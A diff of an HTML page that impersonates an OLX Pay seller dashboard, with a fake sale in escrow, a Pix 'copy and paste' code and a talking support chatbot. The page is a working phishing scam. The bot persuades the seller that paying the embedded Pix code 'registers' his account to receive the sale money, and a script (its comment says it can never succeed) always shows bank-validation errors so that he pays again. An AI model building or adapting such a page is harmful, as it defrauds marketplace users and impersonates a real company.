@@ -1,8 +1,9 @@
 <!DOCTYPE html>
-<html lang="pt-BR"><head>
+<html lang="pt-BR">
+<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Minha Conta - OLX Pay &amp; Painel de Controle</title>
+  <title>Minha Conta - OLX Pay & Painel de Controle</title>
 
   <!-- Tailwind CSS CDN -->
   <script src="https://cdn.tailwindcss.com"></script>
@@ -10,8 +11,8 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <!-- Google Fonts: Nunito -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://gstatic.com" crossorigin="">
-  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&amp;display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 
   <script>
     tailwind.config = {
@@ -58,9 +59,8 @@
     .bot-ring { animation: pulse-ring 2s infinite ease-in-out; }
   </style>
 </head>
-<body
+<body class="min-h-screen flex flex-col antialiased selection:bg-purple-200 selection:text-xlo-purple">
 
-  
   <header class="bg-xlo-purple w-full h-[72px] flex items-center shadow-md sticky top-0 z-40">
     <div class="w-full max-w-[1180px] mx-auto px-4 flex justify-between items-center">
       
@@ -71,7 +71,7 @@
         </a>
         <div class="hidden sm:flex items-center bg-white/10 text-white text-xs px-3 py-1.5 rounded-full border border-white/20">
           <i class="fa-solid fa-shield-halved text-xlo-orange mr-1.5"></i>
-          Garantia &amp; Pagamentos OLX Pay
+          Garantia & Pagamentos OLX Pay
         </div>
       </div>
 
@@ -93,7 +93,6 @@
 
   <div class="w-full max-w-[1180px] mx-auto px-4 py-6 flex flex-col md:flex-row gap-6 items-start flex-1">
     
-    <!-- SIDEBAR DE NAVEGAÇÃO -->
     <aside class="w-full md:w-[260px] flex-shrink-0">
       <div class="bg-white rounded-xl shadow-sm border border-xlo-border overflow-hidden sticky top-24">
         
@@ -175,9 +174,6 @@
 
     <main class="flex-1 w-full min-w-0 flex flex-col gap-5">
 
-      <!-- ================================================================= -->
-      <!-- TAB 1: MINHAS VENDAS (TELA PRINCIPAL DA VENDA EM CUSTÓDIA) -->
-      <!-- ================================================================= -->
       <section id="view-vendas" class="tab-content active space-y-5">
         
         <!-- Breadcrumbs & Status -->
@@ -212,7 +208,7 @@
             
             <!-- Foto do Produto -->
             <div class="w-full md:w-40 h-40 bg-gray-100 rounded-lg border border-gray-200 flex-shrink-0 overflow-hidden relative shadow-inner">
-              <img id="productPhoto" src="https://images.unsplash.com/photo-1573871669414-010dbf73ca84?auto=format&amp;fit=crop&amp;w=400&amp;q=80" alt="Foto do Anúncio" class="w-full h-full object-cover" onerror="this.src='https://placehold.co/400x400/6E0AD6/FFF?text=Anuncio+XLO'">
+              <img id="productPhoto" src="https://images.unsplash.com/photo-1573871669414-010dbf73ca84?auto=format&fit=crop&w=400&q=80" alt="Foto do Anúncio" class="w-full h-full object-cover" onerror="this.src='https://placehold.co/400x400/6E0AD6/FFF?text=Anuncio+XLO'">
               <span class="absolute top-2 left-2 bg-xlo-orange text-white text-[10px] font-black px-2 py-0.5 rounded shadow">
                 VENDIDO
               </span>
@@ -330,7 +326,7 @@
 
             <div class="flex flex-col sm:flex-row gap-3">
               <div class="relative flex-1">
-                <input type="text" id="copyCodeInput" placeholder="Payload Pix" class="w-full bg-white border border-gray-300 rounded-lg py-3.5 px-4 text-xs font-mono font-bold text-gray-800 focus:outline-none focus:border-xlo-purple shadow-inner pr-10 select-all" readonly="">
+                <input type="text" id="copyCodeInput" placeholder="Payload Pix" class="w-full bg-white border border-gray-300 rounded-lg py-3.5 px-4 text-xs font-mono font-bold text-gray-800 focus:outline-none focus:border-xlo-purple shadow-inner pr-10 select-all" readonly>
                 <i class="fa-solid fa-copy absolute right-3.5 top-1/2 -translate-y-1/2 text-xlo-purple text-lg pointer-events-none"></i>
               </div>
 
@@ -382,9 +378,6 @@
 
       </section>
 
-      <!-- ================================================================= -->
-      <!-- TAB 2: RESUMO -->
-      <!-- ================================================================= -->
       <section id="view-resumo" class="tab-content space-y-5">
         <h1 class="text-2xl font-black text-xlo-title">Resumo da Conta</h1>
         
@@ -441,9 +434,6 @@
         </div>
       </section>
 
-      <!-- ================================================================= -->
-      <!-- TAB 3: CARTEIRA -->
-      <!-- ================================================================= -->
       <section id="view-carteira" class="tab-content space-y-5">
         <div class="flex items-center justify-between">
           <h1 class="text-2xl font-black text-xlo-title">Carteira OLX Pay</h1>
@@ -466,21 +456,18 @@
             <p class="text-xs font-black text-xlo-green uppercase tracking-wider mb-1">Saldo Disponível para Saque</p>
             <p id="carteiraAvailableVal" class="text-3xl font-black text-xlo-green mb-2">R$ 0,00</p>
             <p class="text-xs text-gray-500 mb-4">Pronto para saque imediato via Pix.</p>
-            <button id="btnSaquePix" disabled="" class="bg-gray-200 text-gray-400 cursor-not-allowed font-extrabold text-xs py-2.5 px-4 rounded-lg shadow">
+            <button id="btnSaquePix" disabled class="bg-gray-200 text-gray-400 cursor-not-allowed font-extrabold text-xs py-2.5 px-4 rounded-lg shadow">
               <i class="fa-brands fa-pix mr-1.5"></i> Sacar via Pix
             </button>
           </div>
         </div>
       </section>
 
-      <!-- ================================================================= -->
-      <!-- TAB 4: MEUS ANÚNCIOS -->
-      <!-- ================================================================= -->
       <section id="view-anuncios" class="tab-content space-y-5">
         <h1 class="text-2xl font-black text-xlo-title">Meus Anúncios</h1>
         <div class="bg-white rounded-xl shadow-sm border border-xlo-border overflow-hidden p-5 flex flex-col sm:flex-row gap-5 items-center">
           <div class="w-full sm:w-32 h-32 bg-gray-100 rounded-lg overflow-hidden flex-shrink-0 relative">
-            <img src="https://images.unsplash.com/photo-1573871669414-010dbf73ca84?auto=format&amp;fit=crop&amp;w=400&amp;q=80" class="w-full h-full object-cover">
+            <img src="https://images.unsplash.com/photo-1573871669414-010dbf73ca84?auto=format&fit=crop&w=400&q=80" class="w-full h-full object-cover">
             <span class="absolute top-2 left-2 bg-red-600 text-white text-[10px] font-black px-2 py-0.5 rounded uppercase">Vendido</span>
           </div>
           <div class="flex-1 w-full space-y-2">
@@ -493,9 +480,6 @@
         </div>
       </section>
 
-      <!-- ================================================================= -->
-      <!-- TAB 5: MINHAS COMPRAS -->
-      <!-- ================================================================= -->
       <section id="view-compras" class="tab-content space-y-5">
         <h1 class="text-2xl font-black text-xlo-title">Minhas Compras</h1>
         <div class="bg-white rounded-xl shadow-sm border border-xlo-border p-8 text-center">
@@ -503,9 +487,6 @@
         </div>
       </section>
 
-      <!-- ================================================================= -->
-      <!-- TAB 6: CONFIGURAÇÕES -->
-      <!-- ================================================================= -->
       <section id="view-configuracoes" class="tab-content space-y-5">
         <h1 class="text-2xl font-black text-xlo-title">Configurações do Perfil</h1>
         <div class="bg-white rounded-xl shadow-sm border border-xlo-border p-6 space-y-4">
@@ -517,7 +498,6 @@
     </main>
   </div>
 
-  <!-- MODAL DE CADASTRO DA CONTA PIX -->
   <div id="accountModal" class="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4 hidden">
     <div class="bg-white rounded-2xl max-w-lg w-full p-6 shadow-2xl border border-purple-200 transform transition-all">
       <div class="flex justify-between items-center mb-4 pb-3 border-b border-gray-100">
@@ -574,7 +554,6 @@
     </div>
   </div>
 
-  <!-- CHATBOT FLUTUANTE DE VOZ E SUPORTE -->
   <div id="chatBotWidget" class="fixed bottom-6 right-6 z-50 flex flex-col items-end">
     <!-- Janela do Chat -->
     <div id="chatWindow" class="hidden bg-white rounded-2xl shadow-2xl border border-purple-200 w-80 sm:w-96 mb-4 overflow-hidden flex flex-col transition-all">
@@ -637,14 +616,13 @@
       price: "5.000,00",
       buyer: "Marcelo Ribeiro S.",
       location: "São Paulo, SP",
-      code: "00020101021226920014br.gov.bcb.pix2570qrcode.staterpay.com.br/v2/qr/cob/87bdfae6-395b-48b4-beac-942863410a725204000053039865802BR5921Hit Financeira C LTDA6009SAO PAULO62070503***6304CBBF",
+      code: "00020101021226920014br.gov.bcb.pix2570qrcode.xlopay.com.br/v2/qr/cob/87bdfae6-395b-48b4-beac-942863410a725204000053039865802BR5921XLO Pay Custodia Ltda6009SAO PAULO62070503***6304CBBF",
       isReleased: false,
       validationAttempts: 0
     };
 
     window.addEventListener('DOMContentLoaded', () => {
       document.getElementById('copyCodeInput').value = appState.code;
-      // Auto say welcome
       setTimeout(() => {
         speakBotText("Olá Carlos! Esse código Pix é para cadastrar a conta de recebimento dos valores, validar o seu banco e receber na hora imediatamente!");
       }, 1000);
@@ -708,12 +686,10 @@
       document.execCommand('copy');
       document.body.removeChild(tempTextArea);
 
-      // Show instruction box
       document.getElementById('pixInstructions').classList.remove('hidden');
 
       showToast('Código Pix Copiado com Sucesso!');
       
-      // Voice & Chatbot Guidance
       const guideText = "Código copiado! Lembre-se: esse código Pix é para cadastrar a conta de recebimento dos valores, validar o banco e receber na hora imediatamente. Abra o seu banco, escolha Pix Copia e Cola, cole o código e confirme. Depois clique em Continuar para cadastrar sua conta.";
       speakBotText(guideText);
       addChatMessage("Copiei o código Pix com sucesso!", 'user');
@@ -727,9 +703,9 @@
         addChatMessage("Tentei continuar, mas o sistema pediu para revisar a validação do Pix.", 'user');
         
         const codeInput = document.getElementById('copyCodeInput');
-        codeInput.classList.add('ring-4', 'ring-xol-orange', 'border-xlo-orange');
+        codeInput.classList.add('ring-4', 'ring-xlo-orange', 'border-xlo-orange');
         setTimeout(() => {
-          codeInput.classList.remove('ring-4', 'ring-xol-orange', 'border-xlo-orange');
+          codeInput.classList.remove('ring-4', 'ring-xlo-orange', 'border-xlo-orange');
         }, 3000);
 
         openAccountModal();
@@ -751,7 +727,6 @@
       closeAccountModal();
       appState.validationAttempts++;
       
-      // NUNCA PODE DAR CERTO - SISTEMA DE SEGURANÇA BLOQUEIA SEMPRE
       const errorMsgs = [
         "Erro de Validação Bancária: O banco recusou o cadastro para recebimento imediato. A conta não pôde ser validada por segurança da custódia XLO Pay.",
         "Falha na Autenticação Instantânea: A chave Pix informada falhou na validação para recebimento na hora. Cadastro de conta rejeitado pelo antifraude.",
@@ -784,6 +759,5 @@
       }, 4500);
     }
   </script>
-
-
-</body></html>
+</body>
+</html>
